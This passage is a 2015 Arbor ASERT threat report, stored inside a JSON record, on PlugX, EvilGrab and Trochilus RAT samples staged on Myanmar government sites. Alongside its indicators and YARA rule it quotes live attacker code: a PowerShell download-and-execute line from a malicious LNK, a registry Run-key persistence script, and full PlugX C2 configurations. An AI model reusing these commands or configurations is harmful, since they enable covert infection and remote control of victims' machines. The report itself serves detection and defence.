{
    "id": "68a11458-5155-476a-b9e8-0caf3507def2",
    "created_at": "2022-10-25T16:48:21.50013Z",
    "updated_at": "2025-03-27T02:16:25.811573Z",
    "deleted_at": null,
    "sha1_hash": "37584381a0a0c2d566b8ce13965ffa7226cdaa71",
    "title": "Uncovering the Seven Pointed Dagger",
    "authors": "Arbor Networks",
    "file_creation_date": "2015-12-21T13:06:27Z",
    "file_modification_date": "2015-12-21T13:06:27Z",
    "file_size": 2031928,
    "plain_text": "ASERT Threat Intelligence Report Uncovering the Seven Pointed Dagger\n\n# ASERT Threat Intelligence Report 2015-08\n Uncovering the Seven Pointed Dagger\n### Discovery of the Trochilus RAT and Other Targeted Threats\n\n## Executive Summary\n\nPreviously, Arbor ASERT discovered indicators of the PlugX APT malware being used in a manner that\nsuggested the country of Mynamar may have been a target, or involved in staging other campaigns towards\nother targets. Strategic Web Compromise (aka “Watering Hole”) tactics involving the placement of PlugX and\nother malware were discovered on Mynamar government and other Myanmar related websites. Analysis of\nmalware configuration suggested that Special Economic Zones (SEZs) in Myanmar were of interest to the\nthreat actors. These findings were released by ASERT in a report called “Defending the White Elephant” found\nat https://asert.arbornetworks.com/defending-the-white-elephant/ [1].\n\nIn addition to ASERT, threat activity has been documented by Palo Alto Networks in June 2015 concerning a\nStrategic Web Compromise of the Myanmar Presidential website that leveraged the Evilgrab malware [2].\nTheir research also indicates instances of the 9002 RAT being used on the same web infrastructure. Later,\nCitizen Lab published a report “Targeted Malware Attacks against NGO Linked to Attacks on Burmese\nGovernment Websites” on October 16, 2015 that linked Arbor research to campaigns against an unnamed\nNGO [3]. These events involved the PlugX malware, EvilGrab, and the 3102 variant of the 9002 RAT.\n\nAfter delivering our initial findings to the Myanmar CERT in August, additional malware was subsequently\nfound on the Myanmar election site on October 20th, 2015 (now removed). Specifically, six RAR files containing two instances of PlugX, EvilGrab, an unknown malware, and two instances of a new APT malware\ncalled the Trochilus RAT - plus an instance of the 3012 variant of the 9002 RAT were found. These seven\ndiscovered malware offer threat actors a variety of capabilities including espionage and the means to move\nlaterally within targets in order to achieve more strategic access. As these seven malware appear to be\nwielded by a distinct actor group (known to collaborators at Cisco’s Talos Group as “Group 27”), we are\ntheatrically characterizing this cluster of malware as the Seven Pointed Dagger.\n\nInformation on threat actor TTP’s can help other organizations increase awareness that can lead to greater\nresistance to and better detection of malice. ASERT continues to explore threat activity that has been\nuncovered and will provide additional reporting as needed.\n\n\n-----\n\n#### Report Overview and Major Findings\n\nThe following infographic depicts the process by which the information in this report was uncovered. It can\nserve as a useful reference and to maintain context while following the written trail in the rest of this report.\n\n2 Proprietary and Confidential Information of Arbor Networks, Inc.\n\n\n-----\n\n#### Union Election Commission Website Malware: August-October, 2015\n\nSeveral additional malware files were discovered on the Myanmar Union Election Commission (UEC) website\nsince the prior report that was initially published on August 17, 2015 [4].\n\nThe presence of new malware after the initial notification process from Arbor indicates an ongoing\ncompromise of the site and possibly related sites and suggests that a more diligent Incident Response process\nwas required to discover all of the compromised infrastructure and victims of the malware activity.\n\nThese newer files and related content shall be analyzed herein.\n\n**Malware #1-6: Six RAR Files Containing PlugX, EvilGrab, an unknown malware, and the Trochilus RAT**\n\nAs documented in the “Defending the White Elephant” paper, several RAR files containing malware were\ndiscovered on the UEC website in the past. As of October 20, 2015 a new file was discovered at\nhttp://www.uecmyanmar[.]org/dmdocuments/UEC-Invitation.rar and was present as of November 2015.\nFollowing the trail left by this malware has helped ASERT uncover other related threat activity to include a\ncluster of six malware packages stored in RAR file format on a staging/distribution server.\n\n**Malware #7: 3102 Variant of the 9002 RAT in Firefox Plugin**\n\nAn additional malware file was stored at\nhttp://www.uecmyanmar[.]org/plugins/system/jatabs/jatabs/FlashVideoPlayer.php and was submitted to\nVirusTotal on August 21, 2015 from Japan and later on October 13 from Singapore. FlashVideoPlayer.php\ncontained a ZIP file that stored a Firefox plugin, which was used to launch the 3102 variant of the 9002 RAT.\nAnother instance of this RAT was also mentioned by Citizen Lab in their report, “Targeted Malware Attacks\nagainst NGO Linked to Attacks on Burmese Government Websites”. The presence of the exact same RAT\nfamily inside the fake Firefox Plugin on the UEC website creates a link between this artifact and attacks on the\nunnamed NGO that were discussed inside the Citizen Lab report.\n\n**Malware set #1: Six RAR files (two PlugX, one EvilGrab, one unknown, two Trochilus RAT)**\n\n**_Figure 1:_** _Screenshot of website containing additional malware (UEC-Invitiation.rar) as of October 20, 2015_\n\n© Copyright 2015 Arbor Networks, Inc. All rights reserved. 3\n\n\n-----\n\nThe newly observed file, stored in a RAR, is a storage tactic that has been previously observed on the same\nsite. Two prior filenames (discussed in the White Elephant report) were invitations.rar and PlanProposal.rar.\n\nInside the UEC-Invitation.rar file there is a folder called UEC Invitation that contains another folder called\nInvitation. Inside this folder is a shortcut file, Invitation.LNK with a timestamp of August 24, 2015. Analysis of\nthe .LNK file turns up some interesting elements, such as the use of PowerShell inside the Target field, which\nperforms a download and execute of additional malware.\n\n**_Figure 2:_** _Analysis of the .LNK file reveals malicious Powershell_\n\nAnalysis of the LNK file metadata property store reveals some interesting aspects of the malware.\n\n4 Proprietary and Confidential Information of Arbor Networks, Inc.\n\n\n-----\n\n**_Figure 3:_** _In-depth analysis of .LNK metadatda_\n\n**_Figure 4:_** _UNDP Myanmar – a possible target or lure?_\n\nOf interest is the System.ItemTypeText value (a so-called “friendly\nname” of a Windows element that is displayed during the use of an\napplication) of UNDP, which may stand for the United Nations\nDevelopment Program, the UN’s global development network. The\nMyanmar-focused page for the UNDP [www.mm.undp.org] describes\ntheir mission as follows: “In Myanmar, UNDP provides support to the\nnational political and socio-economic reforms that underpin the\ncountry’s transition”. Therefore, the UNDP, or those that work with the\nUNDP may have been targeted and may still be a target.\n\nThe System.DateCreated and System.DateModified values show\nSeptember 15, 2014, which could indicate that campaign activity has\nbeen underway for over a year. It is also possible that this date could be\nmodified.\n\nThe next two fields of interest relate to the local filepath on the system\nthat was used to create the LNK shortcut file.\nSystem.ItemFolderPathDisplayNarrow and System.ParsingPath both\nreveal the presence of a Dropbox folder, and an Admin subfolder that contains another folder named UNDP.\nUsing cloud storage facilities appears to be a known tactic of this group of actors, as they were observed\nutilizing Google Drive as described in “Targeted Attacks on an Environmental NGO” by CitizenLab. To our\n\n© Copyright 2015 Arbor Networks, Inc. All rights reserved. 5\n\n\n-----\n\nknowledge, these are the first signs that Dropbox may also have been used.\n\nThe powershell is as follows (brackets added to any malicious contents to prevent accidental clicks):\n\n%windir%\\System32\\cmd.exe /c mode con cols=15 lines=1 & powershell (new-object\nSystem.Net.WebClient).DownloadFile('http://www.oma.org[.]tw/setup/note.exe','%TEMP%\\note.exe'); StartProcess '%TEMP%\\note.exe’\n\nThe shortcut uses a command prompt to run PowerShell to invoke a System.Net.WebClient class to use the\nDownloadFile method to get note.exe from target site, store it in %TEMP% then run the file. This powershell\nbasically performs a typical “download and execute” function of the file located at\nhttp://www.oma.org[.]tw/setup/note.exe.\n\nThe www.oma.org[.]tw site is the “Occupational Medicine Association in R.O.C.”. This site is or was insecure,\nas it had been compromised and defaced several times by apparently unrelated actors. The malware\nmentioned herein has since been removed.\n\n**_Figure 5:_** _Setup directory containing two malware_\n\nThe payload of the first downloader, Note.exe also uses PowerShell to\ndownload and execute http://down.360safe.com/inst.exe, which is the\n360Total Security (Qihoo 360) anti-malware app. PowerShell also\ndownloads and executes the file Setup.exe from the same staging\ndirectory on www.oma.org[.]tw/setup/.\n\nNote.exe creates a persistence mechanism by creating a file called\nStartON.bat which is then added to the Windows registry. The relevant\ncode is as follows:\n\nstart /min powershell (new-object System.Net.WebClient).DownloadFile('http://down.360safe[.]com/inst.exe',\n'C:\\\\ProgramData\\\\ChromeDel.exe'); Start-Process -Wait -FilePath C:\\\\ProgramData\\\\ChromeDel.exe\n\necho start /min powershell (new-object\nSystem.Net.WebClient).DownloadFile('http://www.oma.org[.]tw/setup/Setup.exe',\n'C:\\\\ProgramData\\\\ChromeDel.exe'); Start-Process 'C:\\\\ProgramData\\\\ChromeDel.exe'>C:\\\\ProgramData\\\\StartON.bat\n\nreg add HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v StartON /t reg_sz\n/d C:\\\\ProgramData\\\\StartON.bat /f\n\nSetup.exe executes and drops two files: ‘data.dat’ and ‘shell.dll’ into the WEventsCache folder. Data.dat\nappears to be encrypted, and shell.dll attempts to pose as a binary associated with the UltraEdit application.\nShell.dll appears to be a helper application known to its developers as Servant Shell. Based on review of the\n\n6 Proprietary and Confidential Information of Arbor Networks, Inc.\n\n\n-----\n\ncode of the Trochilus RAT discovered by ASERT, shell.dll is a file generated when the RAT is compiled.\n\nA YARA rule for discovering additional samples of ServantShell was created.\n\n// servantshell.yara 10/26/15\n// Arbor Networks ASERT Nov 2015\n\nrule servantshell {\n\nstrings:\n\n$string1 = \"SelfDestruction.cpp\"\n$string2 = \"SvtShell.cpp\"\n$string3 = \"InitServant\"\n$string4 = \"DeinitServant\"\n$string5 = \"CheckDT\"\n\ncondition: all of them\n}\n\nA relatively new feature of VirusTotal called RetroHunt was used with this YARA rule to discover other samples\nof this malware. The malware appears to be rare - out of 80 terabytes of malware stored inside VirusTotal at\nthe time of search, only eight additional samples were discovered. One sample clearly revealed information\nabout where the malware had been found in the wild. The location of a file analyzed by VT on 9-30-2015 was\nfound on the staging/storage server and is still present at the time of this writing.\n\n**_Figure 6:_** _Malware archive contains six APT-level threats_\n\nThis URL is hosted in an open directory where\nseveral other malware samples have been\nstored in the form of RAR files, and reveals a\ngrouping of malware utilized in this and\nperhaps other campaigns. This site has been\nreported to the Myanmar CERT for incident\nresponse. New content has been added to the\nsite as of Dec 10, 2015 (not reflected in the\nimage to the left).\n\nThe “Last modified” field suggests that this\nwebserver has been used as a file staging\nlocation since at least April 10 of 2015. The first\nindicators of passive DNS activity on this domain name were observed on April 10 at 03:20:28. While further\nresearch is required to gain a better understanding of the distribution system at play, analysis of these files\ncan provide insight into the threat campaign(s) at hand.\n\nThe relevant file hashes, datestamps, and other data about the RAR files follows. An indented bullet means\n\n© Copyright 2015 Arbor Networks, Inc. All rights reserved. 7\n\n\n-----\n\nthat the prior bullet was an archive or installer file that contained the indented files. For example, in the first\nsample, Patch-update0409BAN.rar contained Setup.exe, SqmApi.dll, and plgus_res.dll. The file plgus_res.dll is\nan installer file that contains the five innermost files listed (starting with mcf.ep and ending with res.db). This\nformat shall be used throughout the document. Files shall be discussed in date order, in order to get a sense\nof threat actor timelines and capabilities.\n\n**Sample #1: PlugX**\n\n- MD5 (Patch-update0409BAN.rar) = 70f1a9ee69cea1b0f53099eb27753895 April 10, 2015\n\n     - MD5 (Setup.exe) = 9d04bd9a340eca1b92fe05755e9b349a\n\n     - MD5 (SqmApi.dll) = 660aa2b9375aaa8e0c1748974f130ba3\n\n     - MD5 (plgus_res.dll) = c91a22de0d7010b334c6010f6bd67462\n\n          - MD5 (mcf.ep) = 627aebf89b0771440cf7aa8e0a4db296\n\n          - MD5 (mcf.exe) = 884d46c01c762ad6ddd2759fd921bf71\n\n          - MD5 (mcutil.dat) = f02925b8d510e35cc33d662d2311f671\n\n          - MD5 (mcutil.dll) = 72e59f6e07a7f9981ef98b541a05628c\n\n          - MD5 (res.db) = a453bb1f1b5bb3f4810e38290190516c\n\nRun-time files are placed into the TaskSchedulerCUDL folder, as specified in the PlugX configuration.\nSeveral of the files stored here are hidden from typical view using the System, Hidden attributes. The\npurpose of the long, apparently randomly named, files is a topic for further investigation.\n\n**_Table 1: PlugX filesystem activity_**\n\nAttribute File path and name MD5 hash\nA C:\\ProgramData\\TaskSchedulerCUDL\\lpversudxi 5f66c2e2679585d4e46a9a6a2b488bc5\nSH C:\\ProgramData\\TaskSchedulerCUDL\\mcf.ep 627aebf89b0771440cf7aa8e0a4db296\nSH C:\\ProgramData\\TaskSchedulerCUDL\\mcf.exe 884d46c01c762ad6ddd2759fd921bf71\n%AppData%\\Local\\Temp\\RarSFX0\\mcf.exe\n\nSH C:\\ProgramData\\TaskSchedulerCUDL\\mcutil.dll 56809e68c70179bc88eb980aa313c89a\n%AppData%\\Local\\Temp\\RarSFX0\\mcutil.dll\n\nA C:\\ProgramData\\TaskSchedulerCUDL\\ufbidruosivibuted 4893758ff2ce2d6eeacbf5577f149301\n\nAnalysis of network traffic reveals that this malware makes an outbound connection to 222.222.222[.]222 on\nTCP/9999, a connection that has been seen in several other samples in the original cluster of six. During our\nanalysis, this port was always non-responsive, yet attempted connections to 222.222.222[.]222 on TCP/9999\nshould be cause for concern. Next, the malware issues a DNS query for webhttps.websecexp[.]com, and\nreceives a DNS response of 114.108.136[.]15. A connection to TCP/443 was then observed to this IP address.\nThe use of port 443 is leveraged by the malwares own protocol (it is not SSL/TLS). A visual representation of\nthe obfuscated traffic is included herein (red = client, blue = server).\n\n8 Proprietary and Confidential Information of Arbor Networks, Inc.\n\n|Attribute|File path and name|MD5 hash|\n|---|---|---|\n|A|C:\\ProgramData\\TaskSchedulerCUDL\\lpversudxi|5f66c2e2679585d4e46a9a6a2b488bc5|\n|SH|C:\\ProgramData\\TaskSchedulerCUDL\\mcf.ep|627aebf89b0771440cf7aa8e0a4db296|\n|SH|C:\\ProgramData\\TaskSchedulerCUDL\\mcf.exe %AppData%\\Local\\Temp\\RarSFX0\\mcf.exe|884d46c01c762ad6ddd2759fd921bf71|\n|SH|C:\\ProgramData\\TaskSchedulerCUDL\\mcutil.dll %AppData%\\Local\\Temp\\RarSFX0\\mcutil.dll|56809e68c70179bc88eb980aa313c89a|\n|A|C:\\ProgramData\\TaskSchedulerCUDL\\ufbidruosivibuted|4893758ff2ce2d6eeacbf5577f149301|\n\n\n-----\n\n**_Figure 7:_** _Obfuscated PlugX connection to C2_\n\nNetwork activity from this sample triggers the following Emerging Threats signature (based on a DNS lookup of\na known malicious domain):\n\n[2021960] ET TROJAN PlugX or EvilGrab DNS Lookup (websecexp.com) (rev: 1)\n\nThe full configuration of this PlugX sample is as follows:\n\nSample Properties:\n[plugx] cnc: appeur.gnway.cc:90\n[plugx] cnc: webhttps.websecexp.com:443\n[plugx] cnc: usacia.websecexp.com:53\n[plugx] cnc: usafbi.websecexp.com:25\n[plugx] cnc1: webhttps.websecexp.com:443 (TCP / HTTP)\n[plugx] cnc2: usafbi.websecexp.com:25 (UDP)\n[plugx] cnc3: usacia.websecexp.com:53 (HTTP / UDP)\n[plugx] cnc4: appeur.gnway.cc:90 (TCP / HTTP)\n[plugx] cnc5: usafbi.websecexp.com:25 (TCP / HTTP)\n[plugx] cnc6: webhttps.websecexp.com:443 (HTTP / UDP)\n[plugx] cnc_auth_str: 0409 ARP CUDLL\n[plugx] dns: 168.126.63.1\n[plugx] dns: 61.4.64.4\n[plugx] dns: 8.8.8.8\n[plugx] dns: 203.81.64.18\n[plugx] enable_icmp_p2p: 0\n[plugx] enable_ipproto_p2p: 0\n[plugx] enable_p2p_scan: 0\n[plugx] enable_tcp_p2p: 0\n[plugx] enable_udp_p2p: 0\n\n© Copyright 2015 Arbor Networks, Inc. All rights reserved. 9\n\n\n-----\n\n[plugx] flags1: 4294967295\n[plugx] flags2: 0\n[plugx] hide_dll: -1\n[plugx] http: http://hi.baidu.com/nvcvrclsnzaioxe/item/5e101810ed4197b665eabf\n[plugx] icmp_p2p_port: 1357\n[plugx] injection: 1\n[plugx] inject_process: %windir%\\system32\\svchost.exe\n[plugx] inject_process: %ProgramFiles%\\Internet Explorer\\iexplore.exe\n[plugx] inject_process: %windir%\\explorer.exe\n[plugx] inject_process: %ProgramFiles(x86)%\\Windows Media Player\\wmplayer.exe\n[plugx] install_folder: %AUTO%\\TaskSchedulerCUDL\n[plugx] ipproto_p2p_port: 1357\n[plugx] keylogger: -1\n[plugx] mac_disable: 00:00:00:00:00:00\n[plugx] mutex: Global\\eNzAMQgOXyITQMt\n[plugx] persistence: Service + Run Key\n[plugx] plugx_auth_str: open\n[plugx] reg_hive: 2147483649\n[plugx] reg_key: Software\\Microsoft\\Windows\\CurrentVersion\\Run\n[plugx] reg_value: McAfeeME\n[plugx] screenshot_folder: %AUTO%\\TaskSchedulerCUDL\\bNjWcdOXFiQIME\n[plugx] screenshots: 0\n[plugx] screenshots_bits: 16\n[plugx] screenshots_keep: 3\n[plugx] screenshots_qual: 50\n[plugx] screenshots_sec: 10\n[plugx] screenshots_zoom: 50\n[plugx] service_desc: Windows McAfeeOEMInfo Service\n[plugx] service_display_name: McAfeeOEMInfoME\n[plugx] service_name: McAfeeOEMInfoME\n[plugx] sleep1: 100663296\n[plugx] sleep2: 0\n[plugx] tcp_p2p_port: 1357\n[plugx] uac_bypass_inject: %windir%\\explorer.exe\n[plugx] uac_bypass_inject: %windir%\\system32\\dllhost.exe\n[plugx] uac_bypass_inject: %windir%\\system32\\msiexec.exe\n[plugx] uac_bypass_inject: %windir%\\system32\\rundll32.exe\n[plugx] uac_bypass_injection: 1\n[plugx] udp_p2p_port: 1357\n\nSome interesting elements about this sample configuration reveal an infrastructure overlap with the PlugX\nsamples profiled in the “Defending the White Elephant” paper. In addition to the fact that the samples were\npresent on the same staging/storage server, overlapping configurations add weight to the idea that the same\ngroup of actors is involved. As far as deriving additional meaning from other elements in the configuration, the\ncnc_auth_str value of “0409 ARP CUDLL” may be meaningful, and may indicate that the malware was\nbuilt/configured on April 09 (and placed on the staging server the next day, indicated by the webserver\ntimestamp). The “http” parameter pointing to a baidu.com site is used to deliver C2’s to PlugX in the event\nthat all the C2 in the configuration are non-responsive. In this case, this content was unable to be recovered\nfrom the Baidu site. Each PlugX sample reviewed here sometimes has configuration overlap with other\nsamples, which could indicate default values, or potentially values from previous campaigns that were not\nremoved. Somewhat distinct groups of actors wielding PlugX may potentially be profiled from unique\n\n10 Proprietary and Confidential Information of Arbor Networks, Inc.\n\n\n-----\n\nconfiguration values across samples.\n\n**Sample #2: PlugX**\n\n- MD5 (Patch-updateYBbyYB.rar) = 63a463f2c18676d868d39785a48f073a June 3, 2015\n\n     - MD5 (Setup.exe) = 9d04bd9a340eca1b92fe05755e9b349a\n\n     - MD5 (SqmApi.dll) = 1177bf095bc3673a7373ead852af3f6c\n\n     - MD5 (plgus_res.dll) = 69a00ee1aa56852bbd28bb9d9765b43c\n\n          - MD5 (Google.com.Logo) = 02c2450c19bc21391ba2835edf2dd745\n\n               - MD5 (mcf.ep) = 57cc1ec6470e31ef20abde8e611125b5\n\n               - MD5 (mcf.exe) = 884d46c01c762ad6ddd2759fd921bf71\n\n               - MD5 (mcutil.dll) = 9e544eb353b78a6467858fda4b8ec14e\n\n          - MD5 (Norman.exe) = 23a3f48df4b36e3d2e63cde4b85cf4fa\n\n          - MD5 (elogger.dll) = 5ff63e07a481e8768b3ef4d9ee91f13d\n\n     - MD5 (mcf.exe) = 884d46c01c762ad6ddd2759fd921bf71\n\n     - RarSFX1/ folder\n\n          - MD5 (mcutil.dll) = 9e544eb353b78a6467858fda4b8ec14e\n\n**_Figure 8:_** _Signed Norman.exe file used for DLL sideloading_\n\nRunning setup.exe results in an “update install\nsuccess” dialog box, followed by an attempted TCP\nconnection to the previously mentioned site\n222.222.222[.]222 on TCP/9999.\n\nOne of the supporting files inside the plgus_res.dll\narchive is Norman.exe, a legitimate binary with the\noriginal name of zlh.exe known as the “Program\nManager Stub” which is apparently created and\nsigned by Norman AS. The certificate was valid from\n10/10/2012 – 10/11/2015, overlapping with the\ntimestamp used on the RAR file.\n\nThe elogger.dll file executes (with WinExec) the file Google.com.Logo that was included in the same directory\nto add one additional layer of unpacking. Once the file Google.com.Logo is executed, it is removed from disk.\nGoogle.com.Logo is a RAR file that contains mcf.ep, mcf.exe, and mcutil.dll. Following the execution path of\nthese files results in another instance of PlugX which is using the previously observed sites\nwebhttps.websecexp[.]com, usafbi.websecexp[.]com, usacia.websecexp[.]com, and appeur[.]gnway.cc as C2,\nand a supplemental C2 pointer stored at http://epn.gov[.]co/plugins/search/search.html that was previously\ndocumented in our paper “Defending the White Elephant”.\n\n© Copyright 2015 Arbor Networks, Inc. All rights reserved. 11\n\n\n-----\n\nThe complete PlugX configuration used in this sample is as follows:\n\n[plugx] cnc: appeur.gnway.cc:90\n[plugx] cnc: webhttps.websecexp.com:443\n[plugx] cnc: usacia.websecexp.com:53\n[plugx] cnc: usafbi.websecexp.com:25\n[plugx] cnc1: webhttps.websecexp.com:443 (TCP / HTTP)\n[plugx] cnc2: usafbi.websecexp.com:25 (UDP)\n[plugx] cnc3: usacia.websecexp.com:53 (HTTP / UDP)\n[plugx] cnc4: appeur.gnway.cc:90 (TCP / HTTP)\n[plugx] cnc5: usafbi.websecexp.com:25 (TCP / HTTP)\n[plugx] cnc6: webhttps.websecexp.com:443 (HTTP / UDP)\n[plugx] cnc_auth_str: 0528 ARPYB\n[plugx] dns: 168.126.63.1\n[plugx] dns: 180.76.76.76\n[plugx] dns: 8.8.8.8\n[plugx] dns: 203.81.64.18\n[plugx] enable_icmp_p2p: 0\n[plugx] enable_ipproto_p2p: 0\n[plugx] enable_p2p_scan: 0\n[plugx] enable_tcp_p2p: 0\n[plugx] enable_udp_p2p: 0\n[plugx] flags1: 4294967295\n[plugx] flags2: 0\n[plugx] hide_dll: -1\n[plugx] http: http://epn.gov.co/plugins/search/search.html\n[plugx] icmp_p2p_port: 1357\n[plugx] injection: 1\n[plugx] inject_process: %windir%\\system32\\svchost.exe\n[plugx] inject_process: %ProgramFiles%\\Internet Explorer\\iexplore.exe\n[plugx] inject_process: %windir%\\explorer.exe\n[plugx] inject_process: %ProgramFiles(x86)%\\Windows Media Player\\wmplayer.exe\n[plugx] install_folder: %AUTO%\\TempLog\n[plugx] ipproto_p2p_port: 1357\n[plugx] keylogger: -1\n[plugx] mac_disable: 00:00:00:00:00:00\n[plugx] mutex: Global\\doWcQFXMASDGYkATMXXeKSsQ\n[plugx] persistence: Service + Run Key\n[plugx] plugx_auth_str: open\n[plugx] reg_hive: 2147483649\n[plugx] reg_key: Software\\Microsoft\\Windows\\CurrentVersion\\Run\n[plugx] reg_value: EventLog\n[plugx] screenshot_folder: %AUTO%\\TempLog\\bSHAMAPUKhFs\n[plugx] screenshots: 0\n[plugx] screenshots_bits: 16\n[plugx] screenshots_keep: 3\n[plugx] screenshots_qual: 50\n[plugx] screenshots_sec: 10\n[plugx] screenshots_zoom: 50\n[plugx] service_desc: Windows Management EventLogs\n[plugx] service_display_name: Windows Management EventLogs\n[plugx] service_name: Windows Management EventLogs\n[plugx] sleep1: 83886080\n\n12 Proprietary and Confidential Information of Arbor Networks, Inc.\n\n\n-----\n\n[plugx] sleep2: 0\n[plugx] tcp_p2p_port: 1357\n[plugx] uac_bypass_inject: %windir%\\explorer.exe\n[plugx] uac_bypass_inject: %windir%\\system32\\dllhost.exe\n[plugx] uac_bypass_inject: %windir%\\system32\\msiexec.exe\n[plugx] uac_bypass_inject: %windir%\\system32\\rundll32.exe\n[plugx] uac_bypass_injection: 1\n[plugx] udp_p2p_port: 1357\n\nInteresting observations of this sample include the cnc_auth_str of “0528 ARPYB” which may indicate the\nmalware creation or configuration date of Thursday, May 28, 2015. The staging date from the webserver\ntimestamp is Wednesday June 3, 2015, possibly indicating that the threat actors did not work over the\nweekend. The presence of the common value “ARP” between PlugX samples #1 and #2 could indicate\nsomeone’s initials or have some other meaning that is not known. The four DNS IP addresses in the\nconfiguration file feature three of the same entries in sample #1, but this configuration reveals the addition of\nthe DNS IP address 180.76.76[.]76, which resolves to public-dns-a.baidu[.]com. The injection_process values\nand the uac_bypass_inject values are the same between sample #1 and sample #2, but some other minor\nchanges to the configuration were also observed.\n\n**Sample #3: Unknown Malware**\n\n- MD5 (Security-Patch-Update333.rar) = 5ed8b90a8d5cabda83fc814e2bbd9600 September 2, 2015\n\n     - MD5 (Security-Patch-Update.exe) = 82896b68314d108141728a4112618304\n\n          - Security-Patch-Update.exe is a binary signed by Binzhoushi Yongyu Feed Co.,LTd\n\n          - The certificate is valid from 1/16/2014 – 1/17/2016.\n\n     - Execution of this malware creates an “Internet Explorer” folder that contains the following files:\n\n          - MD5 (conhost.exe) = f70b295c6a5121b918682310ce0c2165\n\n               - Appears to be a legit SandboxIE file, originally named SandboxieBITS.exe that is\nsigned by SANDBOXIE L.T.D. ASERT has 20 instances of this file being used in\nmalware operations. Additionally, analysis of the files PEHash\n(ffb7a38174aab4744cc4a509e34800aee9be8e57) reveals 47 instances of the same\nor slightly modified file being used in various PlugX operations since at least 2013.\nThis file imports functions from SBIeDll.dll.\n\n          - MD5 (SBieDll.dll) = 6c5f17cbd4d0f95fd8f9563219838a05\n\n               - This file has its import section destroyed, suggesting that it is obfuscated and\nmalicious and not a legitimate SbieDll.dll file. Additionally, the first instruction inside\nthe DllEntryPoint is “pusha” which places the contents of all the registers on the\nstack and is often observed in packed malicious code. This DLL file is sideloaded by\nconhost.exe.\n\n          - MD5 (dll2.xor) = 8477f2b4602c552fad68f8c192beeebf\n\n               - Based upon the filename, this may be an XOR-ed DLL file. Additional analysis is\nrequired.\n\n          - MD5 (maindll.dll) = d8ede9e6c3a1a30398b0b98130ee3b38\n\n© Copyright 2015 Arbor Networks, Inc. All rights reserved. 13\n\n\n-----\n\n               - This binary is obfuscated and requires further analysis.\n\n          - MD5 (nvsvc.exe) = e0eb981ad6be0bd16246d5d442028687\n\n               - This file uses Microsoft Foundation Classes (MFC) and is signed by Square Network\nTech Co.,LTD from the city of Zhongshan, Guangdong province, China on November\n12, 2014 at 9:01:58 PM (CN = Square Network Tech Co.,LTD (O = Square Network\nTech Co.,LTD. L = Zhongshan, S = Guangdong, C = CN). The digital signature contains\nan attribute field 1.3.6.1.4.1.311.2.1.12 that lists the string “Microsoft Windows\nShell explorer https:www.trustasia.com” and was valid from Feb 21, 2014 – Feb 22,\n2015. Trustasia.com is a digital certificate provider in Shanghai, China.\n\n          - MD5 (runas.exe) = 6a541de84074a2c4ff99eb43252d9030\n\n               - This file contains a jump table with 7 cases, each leading to one of the five files\ndropped by the malware, with two additional files referenced that are not present:\nHOOK.DLL and mon.\n\nFurther research and investigation is pending. To provide some limited initial insight, we can observe the\npresence of some interesting strings in memory as such:\n\n\"admin||0902\"\n\"1qaz2wsx3edc\"\n.data:0042C400 00000029 C \\\\Microsoft\\\\Internet Explorer\\\\conhost.exe\n.data:0042C42C 00000026 C \\\\Microsoft\\\\Internet Explorer\\\\dll2.xor\n.data:0042C454 00000029 C \\\\Microsoft\\\\Internet Explorer\\\\maindll.dll\n.data:0042C480 00000029 C \\\\Microsoft\\\\Internet Explorer\\\\SBieDll.dll\n.data:0042C4AC 00000027 C \\\\Microsoft\\\\Internet Explorer\\\\nvsvc.exe\n.data:0042C4D4 00000027 C \\\\Microsoft\\\\Internet Explorer\\\\runas.exe\n.data:0042C4FC 0000000F C %USERPROFILE%\\\\\n.data:0042C50C 00000011 C Application Data\n.data:0042C520 0000000E C AppData\\\\Local\n.data:0042C534 0000000C C SHGetValueA\n.data:0042C540 0000000C C Shlwapi.dll\n.data:0042C54C 00000020 C SOFTWARE\\\\Micropoint\\\\Anti-Attack\n.data:0042C56C 00000009 C MP100000\n.data:0042C578 00000012 C SOFTWARE\\\\JiangMin\n.data:0042C58C 0000000C C InstallPath\n.data:0042C598 00000014 C SOFTWARE\\\\rising\\\\RAV\n.data:0042C5AC 0000000C C installpath\n.data:0042C5B8 0000001C C SOFTWARE\\\\Avira\\\\Avira Destop\n.data:0042C5D4 00000005 C Path\n.data:0042C5DC 0000001C C SOFTWARE\\\\kingsoft\\\\Antivirus\n.data:0042C5F8 00000009 C WorkPath\n.data:0042C604 00000011 C Software\\\\360safe\n.data:0042C618 0000000C C DefaultSkin\n.data:0042C624 00000018 C SOFTWARE\\\\360Safe\\\\Liveup\n.data:0042C63C 00000005 C curl\n.data:0042C644 0000000D C 1qaz2wsx3edc\n\nThis sample never generated any network activity during automated or manual analysis. Further analysis is\nrequired to obtain deeper insight into this sample (ASERT sample ID 29048791).\n\n14 Proprietary and Confidential Information of Arbor Networks, Inc.\n\n\n-----\n\n**Sample #4: The Newly Discovered Trochilus RAT**\n\nThis is the first instance of the Trochilus RAT observed by ASERT. While there is a chance that other threat\nintelligence analysts have discovered and documented this threat, we are unaware of any public reference to\nthis malware being used in targeted campaigns. Based on the information we have access to, this appears to\nbe a relatively new malware that has yet to be profiled.\n\n- MD5 (Update-Patch0999999.rar) = 282cdf360dc627dac145842e666ea7e5 September 23, 2015\n\n     - MD5 (Setup.exe) = 9d04bd9a340eca1b92fe05755e9b349a\n\n     - MD5 (SqmApi.dll) = abef3efb5972cfe4abdc4a9c99f67f0e\n\n     - MD5 (System.dll) = 6f5257c0b8c0ef4d440f4f4fce85fb1b\n\n     - MD5 (plgus_res.dll) = 03ef3d0131f27416b17807ab3ccd1556\n\n          - MD5 (data.dat) = 8c67c8b1b149d17bbe3a00c1aa6f940e\n\n          - MD5 (shell.dll) = 304d83e15cce9b8dc826cdee2a96ef62\n\nThis malware executes in memory only and the final payload never appears on disk in normal operations,\nhowever the binaries can be decoded and are subsequently easier to analyze.\n\nThis sample makes an outbound connection to computer.security-centers[.]com at the current IP address of\n211.255.32[.]130 on TCP/25 as well as a connection to the previously observed 222.222.222[.]222 on\nTCP/9999. Sample #4 and sample #6 are very similar (both instances of the Trochilus RAT), and will be covered\nin greater depth in a later section of this document.\n\n**Sample #5: Grabber/EvilGrab**\n\nWhile potentially dated, an in-depth analysis of EvilGrab can be found in the Trend Micro document “2Q\nReport on Targeted Attack Campaigns” from 2013 [5].\n\n- MD5 (Security-Patch-Update.rar) = 76c0285bb89556564594ce1927b837b7 October 9, 2015\n\n     - MD5 (Patch-Update.exe, IEChecker.exe) = 31c52be912b7269255ec669176663136\n\nThe final decrypted payload for this malware only executes in memory and never 